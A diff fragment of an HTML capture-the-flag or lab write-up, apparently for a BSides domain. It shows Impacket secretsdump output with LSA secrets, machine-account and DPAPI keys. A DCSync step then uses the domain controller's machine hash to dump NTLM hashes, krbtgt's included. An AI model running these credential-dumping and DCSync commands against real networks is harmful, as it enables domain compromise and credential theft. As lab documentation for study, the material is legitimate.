-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">$</span><span class="n">MACHINE</span><span class="p">.</span><span class="n">ACC</span> <span class="err">$</span><span class="n">MACHINE</span><span class="p">.</span><span class="n">ACC</span><span class="p">:</span><span class="n">plain_password_hex</span><span class="p">:</span><span class="mi">4</span><span class="n">aaf8d9f90d8d0f7883dc7cfb66d12be1f2d0af130e910936432190b52e40af7faa85a3b26df315dfff4ef9eb716d1d2c204c4631e16b46bed985114edb735cca5c32b008ab75a2287624a46a75e0369d961974c961fc41f7d542fe4e83db5b1f656e5b7e093e6d457c83b208cfdd6f743683de652bddf46af04936d963ccefa897ab427a3f6deb39bf2acfb302ddeff2e5366d566587a47b0203aa0f28a17a8677e22acbf8073e73ba16cf46a23f49e7f7263c98828ad86323f6c3a8a2e1131e4012b31badc0482ff0650023c6fcc8a8ed76fe3b128f3e674391a405a87154393ecfa30e09e3de5a5da40951506ad9c</span>  
-<span class="err">$</span><span class="n">MACHINE</span><span class="p">.</span><span class="n">ACC</span><span class="p">:</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">7</span><span class="n">b22f222a57d771b33826a805543acb8</span>  
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">DefaultPassword</span> <span class="p">(</span><span class="n">Unknown</span> <span class="n">User</span><span class="p">):</span><span class="n">password</span>  
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">DPAPI_SYSTEM</span> <span class="n">dpapi_machinekey</span><span class="p">:</span><span class="mh">0x7e469d12fc010a93951d262c8dcc2678e6410dbd</span>  
-<span class="n">dpapi_userkey</span><span class="p">:</span><span class="mh">0xa3cf76ada7b5a47872bc8c3b2fe8c660f9254c89</span>  
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">NL</span><span class="err">$</span><span class="n">KM</span>   
- <span class="mi">0000</span>   <span class="mi">51</span> <span class="mi">96</span> <span class="n">B6</span> <span class="n">B9</span> <span class="mi">3</span><span class="n">C</span> <span class="n">B8</span> <span class="mi">5</span><span class="n">C</span> <span class="mi">4</span><span class="n">C</span>  <span class="mi">2</span><span class="n">D</span> <span class="n">D2</span> <span class="n">C4</span> <span class="n">C4</span> <span class="mi">36</span> <span class="mi">9</span><span class="n">D</span> <span class="mi">42</span> <span class="mi">68</span>   <span class="n">Q</span><span class="p">...</span><span class="o">&lt;</span><span class="p">.</span>\<span class="n">L</span><span class="o">-</span><span class="p">...</span><span class="mf">6.</span><span class="n">Bh</span>  
- <span class="mi">0010</span>   <span class="mi">13</span> <span class="mi">75</span> <span class="n">A8</span> <span class="mi">9</span><span class="n">F</span> <span class="mi">53</span> <span class="mi">8</span><span class="n">D</span> <span class="mi">78</span> <span class="n">E4</span>  <span class="mi">98</span> <span class="n">C8</span> <span class="mi">18</span> <span class="mi">24</span> <span class="mi">5</span><span class="n">A</span> <span class="n">CF</span> <span class="mi">1</span><span class="n">B</span> <span class="mi">7</span><span class="n">B</span>   <span class="p">.</span><span class="n">u</span><span class="p">..</span><span class="n">S</span><span class="p">.</span><span class="n">x</span><span class="p">....</span><span class="err">$</span><span class="n">Z</span><span class="p">..{</span> <span class="mi">0020</span>   <span class="mi">3</span><span class="n">C</span> <span class="mi">97</span> <span class="n">C8</span> <span class="mi">68</span> <span class="mi">49</span> <span class="n">C4</span> <span class="mi">95</span> <span class="mi">6</span><span class="n">F</span>  <span class="n">AB</span> <span class="n">BB</span> <span class="n">A1</span> <span class="n">FB</span> <span class="mi">50</span> <span class="mi">2</span><span class="n">A</span> <span class="mi">6</span><span class="n">F</span> <span class="mi">8</span><span class="n">D</span>   <span class="o">&lt;</span><span class="p">..</span><span class="n">hI</span><span class="p">..</span><span class="n">o</span><span class="p">....</span><span class="n">P</span><span class="o">*</span><span class="n">o</span><span class="p">.</span> <span class="mi">0030</span>   <span class="n">C4</span> <span class="mi">43</span> <span class="mi">0</span><span class="n">D</span> <span class="n">CC</span> <span class="mi">8</span><span class="n">F</span> <span class="mi">6</span><span class="n">D</span> <span class="mi">47</span> <span class="mi">7</span><span class="n">C</span>  <span class="mi">19</span> <span class="n">CC</span> <span class="n">B5</span> <span class="n">E8</span> <span class="mi">1</span><span class="n">E</span> <span class="mi">55</span> <span class="mi">2</span><span class="n">F</span> <span class="n">AC</span>   <span class="p">.</span><span class="n">C</span><span class="p">...</span><span class="n">mG</span><span class="o">|</span><span class="p">.....</span><span class="n">U</span><span class="o">/</span><span class="p">.</span><span class="n">NL</span><span class="err">$</span><span class="n">KM</span><span class="p">:</span><span class="mi">5196</span><span class="n">b6b93cb85c4c2dd2c4c4369d42681375a89f538d78e498c818245acf1b7b3c97c86849c4956fabbba1fb502a6f8dc4430dcc8f6d477c19ccb5e81e552fac</span>  
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Cleaning</span> <span class="n">up</span><span class="p">...</span>   
+Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
+[*] Target system bootKey: 0x6f5fdaf97f208b1c48ab1cf9d83438e6  
+[*] Dumping cached domain logon information (domain/username:hash)  
+[*] Dumping LSA Secrets  
+[*] $MACHINE.ACC $MACHINE.ACC:plain_password_hex:4aaf8d9f90d8d0f7883dc7cfb66d12be1f2d0af130e910936432190b52e40af7faa85a3b26df315dfff4ef9eb716d1d2c204c4631e16b46bed985114edb735cca5c32b008ab75a2287624a46a75e0369d961974c961fc41f7d542fe4e83db5b1f656e5b7e093e6d457c83b208cfdd6f743683de652bddf46af04936d963ccefa897ab427a3f6deb39bf2acfb302ddeff2e5366d566587a47b0203aa0f28a17a8677e22acbf8073e73ba16cf46a23f49e7f7263c98828ad86323f6c3a8a2e1131e4012b31badc0482ff0650023c6fcc8a8ed76fe3b128f3e674391a405a87154393ecfa30e09e3de5a5da40951506ad9c  
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:7b22f222a57d771b33826a805543acb8  
+[*] DefaultPassword (Unknown User):password  
+[*] DPAPI_SYSTEM dpapi_machinekey:0x7e469d12fc010a93951d262c8dcc2678e6410dbd  
+dpapi_userkey:0xa3cf76ada7b5a47872bc8c3b2fe8c660f9254c89  
+[*] NL$KM   
+ 0000   51 96 B6 B9 3C B8 5C 4C  2D D2 C4 C4 36 9D 42 68   Q...&lt;.\L-...6.Bh  
+ 0010   13 75 A8 9F 53 8D 78 E4  98 C8 18 24 5A CF 1B 7B   .u..S.x....$Z..{ 0020   3C 97 C8 68 49 C4 95 6F  AB BB A1 FB 50 2A 6F 8D   &lt;..hI..o....P*o. 0030   C4 43 0D CC 8F 6D 47 7C  19 CC B5 E8 1E 55 2F AC   .C...mG|.....U/.NL$KM:5196b6b93cb85c4c2dd2c4c4369d42681375a89f538d78e498c818245acf1b7b3c97c86849c4956fabbba1fb502a6f8dc4430dcc8f6d477c19ccb5e81e552fac  
+[*] Cleaning up...   
 </code></pre></div></div>
 
 <h3 id="dcsync-through-machine-account">DCSync through machine account</h3>
 <p>Through Dumping the SYSTEM we can use the DC account to perform DCSync!</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secretsdump.py albalad.bsides.rv/DC01<span class="se">\$</span>@10.2.10.11 <span class="nt">-hashes</span> <span class="s1">':7b22f222a57d771b33826a805543acb8'</span>Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
-<span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied <span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>  
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets  
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secretsdump.py albalad.bsides.rv/DC01\$@10.2.10.11 -hashes ':7b22f222a57d771b33826a805543acb8'Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
+[*] Using the DRSUAPI method to get NTDS.DIT secrets  
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::  
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0f1a374289ceae1e89cc103a9986c2b2:::  
 localuser:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::  
 User:1104:aad3b435b51404eeaad3b435b51404ee:f993698383cc8dc572e8abae5f71c7a1:::  
 Admin:1105:aad3b435b51404eeaad3b435b51404ee:f993698383cc8dc572e8abae5f71c7a1:::  
-albalad.bsides.rv<span class="se">\a</span>hmad.al.satooh:1107:aad3b435b51404eeaad3b435b51404ee:8d181b680d2f46ace51c9f3f5720a60d:::  
-albalad.bsides.rv<span class="se">\o</span>mar.heshnat:1108:aad3b435b51404eeaad3b435b51404ee:ad515ff94211034e7d6b5584c4ab8221:::  
+albalad.bsides.rv\ahmad.al.satooh:1107:aad3b435b51404eeaad3b435b51404ee:8d181b680d2f46ace51c9f3f5720a60d:::  
+albalad.bsides.rv\omar.heshnat:1108:aad3b435b51404eeaad3b435b51404ee:ad515ff94211034e7d6b5584c4ab8221:::  
 </code></pre></div></div>
 
 
